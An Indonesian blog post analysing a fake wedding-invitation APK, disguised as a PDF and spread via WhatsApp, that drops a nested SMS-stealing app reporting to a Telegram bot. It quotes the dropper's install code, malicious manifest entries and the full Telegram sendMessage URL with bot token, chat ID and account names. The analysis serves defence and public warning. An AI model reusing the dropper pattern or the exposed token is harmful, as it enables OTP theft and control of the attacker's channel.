---
title: "Membongkar Aplikasi Penipuan Undangan Digital Reverse Engineering Dan Analisis Teknis Jebakan Modern"
date: 2025-06-18
description: reverse engineering mendalam terhadap aplikasi undangan digital palsu yang ternyata adalah malware dropper canggih dengan payload tersembunyi, kemampuan intercept SMS, dan command & control melalui Telegram Bot API.
tags:
  - digital-forensics
  - metadata
  - exif
  - investigation
  - cybersecurity
layout: post.njk
---


## MEMBONGKAR APLIKASI PENIPUAN UNDANGAN DIGITAL REVERSE ENGINEERING DAN ANALISIS TEKNIS JEBAKAN MODERN 

![icon reverse](/images/posts/reverse.png)


## Pendahuluan

Di era digital yang serba cepat dan terhubung, kejahatan siber tidak lagi datang dengan wajah seram atau peringatan mencolok. Mereka hadir dalam bentuk yang paling tak terduga yaitu undangan digital yang tampak sah, sopan, dan bahkan menarik. Di balik desain antarmuka yang ramah dan janji acara spesial, tersembunyi perangkat lunak berbahaya yang siap mencuri data, menginfeksi perangkat, atau mengambil alih kendali sistem korban.

![status wa](/images/posts/status_wa.png)

Saat saya sedang melihat status WhatsApp teman saya, saya menangkap satu kejanggalan dari sebuah unggahan undangan digital yang dibagikan. Ada sesuatu yang tidak biasa, baik dari cara file itu dikirim maupun dari tampilannya yang sedikit berbeda dari undangan digital pada umumnya. Merasa curiga, saya langsung menghubungi teman saya dan meminta file mentah dari aplikasi tersebut.

![infowa](/images/posts/infowa.png)

Walaupun saat itu file tersebut dibungkus menjadi sebuah file dengan ekstensi .pdf. Ini membuatnya tampak lebih aman dan meyakinkan di mata pengguna awam, padahal di dalamnya tersembunyi ancaman serius.

![pdf](/images/posts/file_pdf.png)

Dari sinilah investigasi ini dimulai. Melalui pendekatan reverse engineering, saya membongkar bagaimana file tersebut bekerja, struktur dan perilaku mencurigakan di balik kemasannya, serta teknik yang digunakan untuk menipu korban. Apa yang tampak seperti undangan biasa, ternyata adalah jebakan modern yang memanfaatkan celah psikologis dan teknis sekaligus.

## Langkah Awal Investigasi VirusTotal dan Anomali Mencurigakan

![vtotal](/images/posts/vtotal.png)

Pertama, saya mencoba menganalisis file tersebut menggunakan layanan pemindaian malware online, VirusTotal.com. Situs ini memungkinkan kita untuk mengunggah file dan melihat apakah file tersebut terdeteksi sebagai berbahaya oleh berbagai mesin antivirus internasional.

![virstotal](/images/posts/virustotal.png)

Hasil pemindaian awal langsung memunculkan sejumlah kejanggalan. Beberapa engine antivirus ternama menandai file tersebut sebagai "suspicious" atau bahkan "trojan dropper". Meski tidak semua engine sepakat, keberadaan peringatan ini sudah cukup menjadi sinyal merah bagi saya untuk menggali lebih dalam. 

Yang menarik, metadata file menunjukkan informasi yang tidak konsisten, misalnya:
- Nama pembuat yang kosong
- Struktur file yang tidak sesuai standar PDF asli
- Indikasi adanya payload tersembunyi di dalam file

Selain itu, saya juga memperhatikan bahwa hash dari file ini belum pernah dipublikasikan sebelumnya di basis data VirusTotal, menandakan kemungkinan bahwa ini adalah varian baru yang belum banyak terdeteksi oleh publik. Semua temuan ini memperkuat dugaan saya bahwa file ini bukan sekadar PDF biasa, melainkan file berbahaya yang dikamuflasekan secara cermat untuk menghindari deteksi.

## Analisis Struktur File Dengan Apktool

Setelah mendapatkan file mentah dan mendeteksinya sebagai file APK yang disamarkan, saya melanjutkan investigasi menggunakan Apktool untuk membongkar isi internal aplikasi.

![apktool](/images/posts/apktool.png)

```bash
apktool d UNDANGAN-PERNIKAHAN.apk -o decode_malware
```

![decodeapk](/images/posts/decodeapk.png)

setelah mendapatkan output folder pertama fokus saya adalah pada file AndroidManifest.xml, yang merupakan tulang punggung sebuah aplikasi Android. File ini seperti peta jalan yang menunjukkan izin, komponen, dan perilaku aplikasi secara global.

![AndroidManifesk](/images/posts/androidmanfiest.png)

File AndroidManifest.xml pada APK UNDANGAN-PERNIKAHAN.apk menggunakan format biner terkompresi (binary XML), sehingga tidak dapat langsung dibaca dalam bentuk teks biasa. Ini adalah hal yang umum di semua APK Android, namun untuk analisis, saya perlu melakukan decoding khusus agar bisa melihat isinya secara utuh.

### Indikasi Umum dari AndroidManifest.xml

#### 1. Nama Paket
```xml
package="com.example.dropevcvb089"
```
- Nama ini tampak acak, generik, dan tidak profesional
- Pola ini sering ditemukan pada APK berbahaya atau hasil build otomatis, sebagai upaya menyembunyikan identitas asli pengembang

#### 2. Label Aplikasi
```xml
android:label="Undangan PDF"
```
- Menggunakan nama yang terkesan sah dan terpercaya
- Ini adalah bentuk social engineering, agar korban berpikir ini hanyalah aplikasi pembuka undangan biasa

#### 3. Permissions (Izin yang Diminta)
```xml
android.permission.REQUEST_INSTALL_PACKAGES
```
- "**BERBAHAYA!!!**" Memberi kemampuan pada aplikasi untuk memasang APK lain secara langsung
- Ini sangat umum digunakan dalam APK dropper, yaitu malware yang tugas utamanya adalah mengunduh dan memasang malware lainnya

```xml
android.permission.READ_EXTERNAL_STORAGE
android.permission.WRITE_EXTERNAL_STORAGE
```
- Memberi akses baca dan tulis ke seluruh penyimpanan perangkat
- Ini bisa digunakan untuk:
  - Mengambil file pribadi pengguna
  - Menyimpan payload atau file jahat
  - Memonitor aktivitas file pengguna

#### 4. Provider dan Receiver
```xml
androidx.core.content.FileProvider
```
- Umumnya digunakan secara sah untuk berbagi file antar-aplikasi
- Namun bila tidak dikonfigurasi dengan benar, bisa digunakan untuk eksfiltrasi data atau mengaburkan jalur akses file

```xml
com.example.droppevcvb089.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION
```
- Sebuah entitas custom permission yang digunakan bersama komponen tersembunyi
- Teknik ini umum digunakan untuk menyembunyikan receiver internal dari sistem Android agar tidak mudah dideteksi oleh alat monitoring
- Biasanya dipakai untuk membuat komunikasi antar-modul dalam aplikasi atau dengan malware lain, tanpa terdeteksi oleh pengguna atau sistem keamanan biasa

File manifest yang tampak biasa ternyata menyimpan banyak sinyal bahaya:
- Nama acak, label palsu, dan izin yang sangat invasif
- Kemampuan untuk memasang APK lain dan mengakses penyimpanan pengguna
- Penggunaan mekanisme permission tersembunyi dan receiver dinamis, yang mengarah pada pola-pola APK jahat bertipe dropper

## Investigasi File Secara Internal

![internalfile](/images/posts/struktur.png)

Setelah saya memahami struktur AndroidManifest.xml, saya melanjutkan proses investigasi dengan memeriksa setiap file penting dalam struktur internal APK. Proses ini dilakukan dengan tujuan untuk mengidentifikasi payload tersembunyi, kode berbahaya, atau class yang memuat logika manipulatif.

### 1. AndroidManifest.xml
Sudah dijelaskan sebelumnya. Meskipun terlihat sederhana, file ini memberikan banyak informasi awal mengenai izin berbahaya, komponen yang dieksport, dan label aplikasi yang menyamar. Namun, hingga titik ini tidak ditemukan jalur langsung menuju kode berbahaya.

### 2. DebugProbesKt.bin
File ini adalah hasil dari Debug Probes milik Kotlin coroutine debugging. Umumnya tidak berbahaya, namun:
- Kehadirannya di APK yang seharusnya untuk "produksi" cukup aneh
- Bisa menjadi indikasi bahwa fitur debug coroutine aktif, yang seharusnya dimatikan dalam rilis final
- Tidak berisi kode eksekusi, namun bisa digunakan untuk melacak alur coroutine, bila dipasangkan dengan debugger

**Kesimpulan**: Tidak langsung berbahaya, tapi mengindikasikan build tidak bersih atau masih aktif debug mode.

### 3. classes.dex, classes2.dex, classes3.dex
File .dex (Dalvik Executable) adalah tempat utama seluruh kode program Java/Kotlin dikompilasi dan dijalankan oleh Android Runtime.

- `classes.dex` biasanya memuat kode utama (core logic)
- `classes2.dex`, `classes3.dex` menunjukkan bahwa aplikasi memiliki kode tambahan atau modularisasi, biasanya dipakai jika ukuran kode melebihi batas

Saya mencoba membuka dan menjelajahi tiap file .dex menggunakan tools seperti JADX dan Bytecode Viewer, tapi belum menemukan class mencurigakan secara eksplisit seperti:
- `com.example.malware`
- `InstallerTask`
- `PayloadInjector`
- Class yang mengakses `DexClassLoader`, `Runtime.exec()`, atau `HttpURLConnection` secara langsung

Namun, karena obfuscation mungkin, bisa jadi nama class dan method telah dikacaukan/diobfuscate.

**Beberapa Indikasi mencurigakan lainnya**:
- Jumlah class cukup besar untuk aplikasi "sekecil" ini
- Banyak class dengan nama acak seperti `a.a.a.b`, `x.y.z.e`, tanpa komentar, yang mengindikasikan kemungkinan adanya obfuscator seperti ProGuard atau R8

## File Terenkode dan Pencarian Listener Tersembunyi

Setelah menelusuri file .dex, AndroidManifest.xml, dan resource penting lainnya, saya menyadari bahwa sebagian besar kode atau data dalam aplikasi ini tidak ditulis secara terbuka. Banyak bagian tampak disamarkan atau di-encode untuk menyulitkan analisis manual.

### Indikasi File Terenkode
Beberapa class yang saya temukan di dalam classes2.dex dan classes3.dex memiliki pola seperti:
- String yang di-encode dalam base64 atau menggunakan metode XOR sederhana
- Class dan method dengan nama seperti `a.a.a.a.a()`, `b.c.d.f()`, tanpa deskripsi yang jelas
- Adanya penggunaan `byte[]` literal yang kemungkinan berisi konfigurasi atau payload yang hanya didekode saat runtime

Ini adalah teknik umum malware modern untuk:
- Menyembunyikan server command & control (C2)
- Menyimpan konfigurasi aksi yang hanya akan aktif dalam kondisi tertentu
- Mencegah deteksi oleh pemindai statis atau AV

### Pencarian Konfigurasi Listener
Selama beberapa jam saya mencoba menelusuri di mana aplikasi ini menyimpan konfigurasi listener atau titik awal komunikasi, misalnya:
- Listener untuk broadcast tertentu
- Service tersembunyi
- Hook terhadap file system atau storage
- Akses jaringan (HTTP, Socket, WebSocket)
- Dynamic class loading

Namun hingga saat ini, saya belum menemukan lokasi file konfigurasi yang jelas. Ada kemungkinan besar bahwa:
- Listener disisipkan secara dinamis melalui refleksi (reflection)
- Dikonfigurasi lewat file terenkripsi yang baru diekstrak saat runtime
- Atau berada di dalam native library (.so) yang belum saya bongkar

Saya juga menduga bahwa payload utama mungkin tidak disimpan dalam bentuk eksplisit, melainkan baru didekripsi setelah aplikasi dijalankan dalam kondisi tertentu, misalnya setelah klik tombol, atau jika aplikasi berhasil mendapat izin akses tertentu.

## Penemuan Kunci di MainActivity Menggunakan JADX

Setelah beberapa jam menggunakan Apktool tanpa hasil yang jelas, saya memutuskan untuk beralih ke JADX, sebuah tool dekompilasi APK berbasis Java yang mampu menampilkan kode sumber dari file .dex dalam bentuk readable Java.

Saya membuka file UNDANGAN-PERNIKAHAN.apk menggunakan JADX-GUI, dan seperti biasa, saya mulai dari AndroidManifest.xml untuk meninjau ulang seluruh konfigurasi aplikasi. Saat saya sampai pada bagian FileProvider, saya mulai mencium adanya pola penyalinan atau distribusi file antar-aplikasi yang sebelumnya terlewat.

### FileProvider Menyimpan Petunjuk Awal
```xml
<provider
    android:name="androidx.core.content.FileProvider"
    android:exported="false"
    android:authorities="com.example.droppevcvb089.provider"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_paths"/>
</provider>
```

Bagian ini menyatakan bahwa:
- Aplikasi menggunakan FileProvider untuk membagikan file ke luar aplikasi
- File yang dibagikan disimpan di lokasi yang diatur dalam `@xml/file_paths`, file ini biasanya berisi konfigurasi direktori mana yang bisa diakses dan dibagikan oleh FileProvider

Namun, misteri terbesar akhirnya terungkap ketika saya menelusuri ke MainActivity, yang merupakan entry point utama aplikasi.

### Penemuan Utama Payload Disimpan di Folder assets dan Disalin Saat Runtime

```java
/* loaded from: classes3.dex */
public class MainActivity extends AppCompatActivity {
    private static final String APK_NAME = ".apk";
```

**Penjelasan**:
- Komentar `/* loaded from: classes3.dex */` menunjukkan bahwa class ini disimpan di file DEX terpisah, bukan di classes.dex, tapi di classes3.dex, mungkin disengaja untuk menyembunyikannya dari pemindai umum
- Variabel `APK_NAME = ".apk"` adalah penunjuk terhadap nama file yang akan diambil dari folder assets
- Di sini terlihat jelas bahwa aplikasi tidak menamai file dengan nama jelas seperti "malware.apk", tetapi hanya menggunakan ekstensi sebagai nama file, trik untuk menghindari deteksi

### Metode Berbahaya installApkFromAssets()

```java
AssetManager assetManager = getAssets();
InputStream in = assetManager.open(APK_NAME); // ambil file .apk dari folder assets
File outputFile = new File(getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), APK_NAME);
```

File APK jahat disimpan di dalam folder assets, yang biasanya digunakan untuk menyimpan data statis (bukan kode eksekusi langsung).

Saat aplikasi dijalankan, ia:
1. Membuka file .apk dari assets
2. Menyalinnya ke direktori download internal perangkat
3. Membuat Uri untuk file tersebut menggunakan FileProvider

```java
Intent intent = new Intent("android.intent.action.VIEW");
intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
intent.setFlags(1);
startActivity(intent);
```

Aplikasi membuat intent eksplisit untuk memasang file APK yang baru disalin. Jika pengguna setuju (atau sistem tidak memblokir), maka payload utama akan diinstal ke perangkat, menjadikan aplikasi ini sebagai APK dropper.

### Folder assets Yang Sangat Terlupakan :v

![assetapk](/images/posts/apkasset.png)

Dan di sinilah ironi muncul. Dalam proses panjang membongkar struktur APK, saya lupa memeriksa folder assets, yang ternyata menyimpan payload utama. Folder ini sering kali dianggap hanya berisi file data pendukung, padahal bisa menjadi tempat favorit bagi malware menyimpan:
- File tambahan (.apk, .dex)
- Konfigurasi terenkripsi
- Atau bahkan exploit runtime

## APK Dalam APK Payload Bersarang

Setelah sebelumnya berhasil menemukan bahwa file .apk jahat disimpan dalam folder assets dan disalin melalui MainActivity, saya kembali melanjutkan analisis dengan membuka jadx-gui sekali lagi.

Namun kali ini, bukan file UNDANGAN-PERNIKAHAN.apk yang membuat saya tertarik, melainkan isi dari folder resources/assets/, khususnya yang termuat di dalam classes3.dex.

Saat saya membuka isi classes3.dex lebih dalam, saya menemukan bahwa:
- Di dalam folder assets/, terdapat sebuah file .apk lain yang disisipkan
- Ini adalah payload sekunder, yang kemungkinan besar adalah aplikasi jahat sebenarnya, disembunyikan dari manifest utama dan hanya dimuat melalui proses runtime

**Dengan kata lain**: ini adalah APK yang berperan sebagai "loader", yang tugasnya hanya menginstal APK lain yang disembunyikan di dalam dirinya sendiri.

### Teknik "Matryoshka APK" – APK Bersarang 
Saya terlewat menginspeksi lebih dalam file yang tampaknya "pasif" di assets/, padahal justru di situlah malware utama bersembunyi. Ini adalah teknik yang sering disebut sebagai:

**"Matryoshka APK"** – seperti boneka Rusia, di mana satu APK mengandung APK lain di dalamnya.

Dan menariknya lagi:
- File .apk ini tidak dinamai dengan jelas
- Ekstensi bisa saja disamarkan atau disimpan sebagai string terenkripsi, lalu diubah pada saat runtime sebelum instalasi
- Karena disimpan di folder assets, tidak akan muncul dalam static scan permission, dan sulit terdeteksi AV jika hanya memindai manifest utama

## Malware Kedua APK Bersarang dengan Kemampuan Pengawasan & Kontrol SMS

![apkapk](/images/posts/apkapk.png)

Setelah membuka kembali file .apk yang disimpan dalam assets/ menggunakan jadx-gui, saya menemukan hal yang benar-benar menguatkan dugaan bahwa APK ini adalah malware tingkat lanjut.

Di dalam file tersebut, tersembunyi AndroidManifest.xml kedua, yang memperkenalkan serangkaian izin sensitif, komponen berbahaya, dan struktur yang ditulis secara "kotor" dengan error encoding. Inilah tanda-tanda malware yang disusun tergesa atau melalui auto-builder ilegal.

### 1. Nama Paket Palsu tapi Familiar
```xml
package="com.google.myandroidpr"
```
Penggunaan kata "com.google." adalah usaha memalsukan kredensial. Banyak pengguna yang akan mengira ini adalah aplikasi resmi Google, padahal myandroidpr adalah penamaan acak/rekayasa yang menyesatkan.

### 2. Permissions (Izin Super Sensitif)
```xml
android.permission.RECEIVE_SMS  
android.permission.READ_SMS  
android.permission.SEND_SMS  
android.permission.INTERNET  
android.permission.RECEIVE_BOOT_COMPLETED  
android.permission.FOREGROUND_SERVICE  
```

Ini sangat berbahaya. Izin-izin ini memungkinkan aplikasi untuk:
- Membaca semua SMS masuk
- Mengirim SMS tanpa izin pengguna (biasanya untuk kode OTP, penipuan pulsa, dll)
- Tetap aktif saat perangkat di-reboot
- Terhubung ke internet untuk mengirim data curian ke server eksternal

Gabungan SMS + INTERNET + BOOT_COMPLETED = ciri khas spyware atau trojan SMS premium.

### 3. Label dan UI Palsu
```xml
android:label="BUKA FOTO"
```
Nama aplikasi yang muncul adalah "BUKA FOTO", lagi-lagi, ini bentuk social engineering. Pengguna awam akan mengira aplikasi ini membuka galeri atau album, padahal isinya sangat berbahaya.

### 4. Receiver Khusus untuk SMS
```xml
<receiver android:name="com.example.myapplicatior.ReceiveSms">
    <intent-filter>
        <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
    </intent-filter>
</receiver>
```

Ini adalah komponen yang akan aktif secara otomatis saat SMS masuk. Artinya:
- Aplikasi bisa membaca setiap pesan yang dikirim ke perangkat
- Bahkan tanpa membuka aplikasi

Dalam dunia malware, ini sering digunakan untuk:
- Membajak OTP
- Mengintersepsi komunikasi bank
- Atau memonitor verifikasi akun

### 5. Komponen Background Service untuk Notifikasi & Background Task
```xml
<service android:name="com.example.myapplicatior.NotificationService" ... />
<service android:name="androidx.work.impl.*" ... />
```

- Ada listener untuk NotificationListenerService, yang memungkinkan aplikasi membaca semua notifikasi dari aplikasi lain
- Banyak service dari androidx.work, menunjukkan adanya penjadwalan tugas otomatis (job scheduler), sering dipakai malware untuk mengatur kapan data dikirim ke server agar tidak mencolok

### 6. Banyak Tag Gagal Didecode
Ini menandakan bahwa:
- File XML ini dibuat dengan encoding tidak standar atau telah disamarkan
- Kemungkinan besar, bagian penting lainnya (action, kategori, meta-data) diobfuski agar tidak bisa dibaca langsung
- Bisa jadi ada trigger tersembunyi, seperti broadcast receiver untuk aksi tertentu yang hanya akan muncul setelah kondisi spesifik terpenuhi (misal: waktu, lokasi, atau SMS tertentu masuk)

### 7. Intent Filter Mencurigakan
```xml
<category android:name="android.intent.category.INFO"/>
```
Biasanya aplikasi umum menggunakan LAUNCHER, tapi ini memakai INFO, yang bisa jadi dimanfaatkan untuk menyembunyikan aplikasi dari launcher, sehingga hanya bisa dijalankan dari luar atau remote command.

## Listener Tersembunyi dengan Endpoint TELEGRAM API

### Lokasi Penemuan
Saya akhirnya menelusuri folder:
```
source_code/com/example/myapplicatior/
```

Dan di dalamnya, ditemukan class-class penting seperti:
- MainActivity
- MainActivityAlias
- NotificationService
- ReceiveSms
- SendSMS
- BuildConfig

  

DAN BOOM! sorotan utama adalah aktivitas tersembunyi yang mengarah ke endpoint Telegram, dan ini adalah tanda khas malware modern yang menggunakan layanan publik untuk menyembunyikan C2 server.

### Bukti Komando C2: Telegram API
Berikut adalah endpoint yang ditemukan:

```
https://api.telegram.org/bot7735932488:AAFCdgKFbN3-MwIicBc6JY2tcEwarIfjvqg/sendMessage?parse_mode=markdown&chat_id=6112756709&text="GOTCHA!!! SIAP SIAP YA BANGGG"
```

![TELEGRAM](/images/posts/tele.png)


#### Analisis Teknis:
- Menggunakan Telegram Bot API sebagai command server
- Format URL ini menunjukkan bahwa aplikasi:
  - Mengirim data ke chat Telegram melalui bot pribadi
  - Memiliki akses ke chat_id, yang berarti mereka tahu ke mana harus mengirim notifikasi
  - Menggunakan format Markdown (sintaks formatting Telegram)
  - sendMessage menunjukkan perintah kirim aktif, bukan hanya menerima instruksi, tapi juga memberi tahu pelaku saat aksi berhasil

#### Apa Artinya?
Bot ini bisa digunakan untuk:
- Menerima OTP dari SMS (karena aplikasi punya RECEIVE_SMS dan READ_SMS)
- Meneruskan pesan notifikasi dari aplikasi ke hacker
- Mengontrol perangkat korban secara pasif
- Memberi tahu jika payload berhasil dieksekusi (dalam hal ini: "GOTCHA!!! SIAP SIAP YA BANGGG")

Bisa juga digunakan untuk mengirimkan data korban, seperti:
- Informasi perangkat (IMEI, model, versi Android)
- Isi SMS masuk
- Lokasi jika ada akses tambahan

## Identitas Pengirim & Penerima di Telegram

Dari endpoint yang ditemukan dalam kode APK, kita akhirnya bisa mengekstrak identitas lengkap dari bot Telegram dan akun penerima yang digunakan sebagai pusat kendali.

### Bot Telegram & Chat Metadata

#### Bot Token
```
bot7735932488:AAFCdgKFbN3-MwIicBc6JY2tcEwarIfjvqg
```
- Bot ini adalah pengirim perintah dan penerima data dari aplikasi jahat
- Token bersifat sensitif, siapa pun yang memiliki token ini bisa mengontrol bot sepenuhnya

#### Informasi Bot
```json
{
  "id": 7735932488,
  "is_bot": true,
  "first_name": "ORANG BARAT",
  "username": "orangbaratagsgsybot"
}
```
- Nama: ORANG BARAT
- Username: @orangbaratagsgsybot
- Ini menandakan pelaku menyamar atau menggunakan identitas palsu agar tampak berasal dari luar negeri

#### Chat Target / Penerima
```json
{
  "id": 6112756709,
  "first_name": "Manis",
  "last_name": "Manja",
  "username": "ttm_mmmm",
  "type": "private"
}
```
- Nama Akun: Manis Manja
- Username: @ttm_mmmm
- ID Chat: 6112756709
- Tipe: Private chat, artinya pesan dari bot dikirim langsung ke akun pribadi ini

Chat ini digunakan untuk:
- Menerima data hasil curian (OTP, info perangkat, notifikasi)
- Notifikasi eksekusi payload, seperti yang terlihat di pesan: "GOTCHA!!! SIAP SIAP YA BANGGG"

## Implikasi Keamanan & Bukti Digital

### Akses Penuh ke Bot & Chat:
Dengan token dan chat ID ini, kita punya:
- Jejak digital pelaku
- Bukti komunikasi malware
- Potensi mengakses log riwayat jika bot masih aktif

### Langkah yang Bisa Diambil:
1. Laporkan bot ke Telegram melalui @BotSupport dengan bukti aktivitas jahat dan token
2. Blokir domain api.telegram.org atau khusus bot{ID} melalui DNS sinkhole, terutama pada jaringan enterprise
3. Gunakan informasi ini untuk:
   - Melacak penyebaran malware sejenis
   - Mencari sample lain yang menggunakan bot/token serupa
   - Menjadi bagian laporan publik / investigasi forensik

## KESIMPULAN & PENUTUP
Setelah membongkar seluruh struktur dari aplikasi UNDANGAN-PERNIKAHAN.apk hingga ke lapisan terdalam—mulai dari manifest palsu, dropper tersembunyi di dalam assets, kode yang disamarkan di classes3.dex, hingga listener yang diam-diam mengirimkan data ke Telegram API—dapat disimpulkan bahwa:

Ini bukan sekadar aplikasi biasa, melainkan malware yang dirancang untuk mencuri data, mengontrol perangkat, dan mengirimkan informasi secara real-time ke pihak luar melalui bot Telegram.

Jangan sembarangan klik aplikasi, apalagi yang dikirim melalui pesan pribadi atau status WhatsApp.
Selalu periksa ekstensi file. File PDF asli tidak akan meminta kamu untuk meng-install apapun.
Jangan install aplikasi dari sumber tidak dikenal atau orang asing.
Jika sebuah aplikasi meminta izin berlebihan (akses SMS, notifikasi, penyimpanan), hentikan proses instalasi segera.
Gunakan antivirus dan alat monitoring pada perangkat Android, terutama jika sering menerima file dari luar.
Investigasi ini mengungkap struktur malware yang sangat canggih yang menggunakan teknik:
- **APK Dropper**: Aplikasi utama yang berperan sebagai penginstal malware lain
- **Matryoshka APK**: Teknik APK bersarang untuk menyembunyikan payload utama
- **Social Engineering**: Menggunakan nama dan tampilan yang menyesatkan
- **C2 melalui Telegram**: Menggunakan layanan populer untuk komunikasi tersembunyi
- **SMS Interception**: Kemampuan membaca dan mengirim SMS untuk mencuri OTP
- **Persistent Access**: Kemampuan tetap aktif setelah reboot perangkat

Kasus ini menunjukkan betapa pentingnya kehati-hatian dalam menerima file, bahkan yang tampak tidak berbahaya seperti undangan digital. Selalu verifikasi sumber file dan gunakan aplikasi keamanan yang terpercaya untuk memindai file sebelum menginstalnya.
Butuh Bantuan atau Ingin Bertanya?
Jika kamu memiliki pertanyaan, atau menemukan file mencurigakan lainnya, silakan hubungi saya melalui halaman kontak. Saya akan dengan senang hati membantu atau mengarahkan lebih lanjut.

Stay Safe dan Tetap Waspada
Dunia digital semakin canggih, dan begitu pula metode kejahatan siber. Tapi dengan pengetahuan dan kewaspadaan, kita bisa tetap satu langkah di depan.

Klik dengan bijak. Install dengan sadar. Waspadai jebakan digital.

## Sampai Jumpa Di Investigasi Dan Tulisan Berikutnya!!
